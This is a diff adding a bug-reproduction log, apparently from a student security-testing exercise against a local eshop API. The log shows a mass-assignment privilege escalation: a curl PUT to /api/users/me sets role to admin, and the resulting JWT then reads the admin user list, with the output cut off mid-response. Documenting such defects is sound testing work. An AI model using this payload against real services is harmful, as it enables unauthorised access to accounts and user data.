@@ -1,0 +1,15 @@
+Tai hien loi — SUT: http://localhost:3000/api
+Thoi diem   : 2026-09-01 20:11:32 +0700
+Student ID  : 23127195 (moi request deu mang header X-Student-Id)
+
+
+### BUG-A1-01 [Critical] SEC-06 — leo quyen len admin qua PUT /api/users/me
+$ curl -X PUT /api/users/me -d {"name":...,"role":"admin"}
+{"message":"Profile updated"}
+$ curl /api/users/me   -> role hien tai:
+admin
+$ dang nhap lai -> JWT moi mang role gi?
+role trong JWT: admin
+$ dung JWT do goi GET /api/admin/users (chi admin moi duoc phep):
+   HTTP 200
+[{"id":1,"name":"Admin User","email":"admin@eshop.com","role":"admin","login_attempts":0,"locked_until":null,"shipping_address":null},{"id":2,"name":"Test User","email":"test@eshop.com","role":"admin"
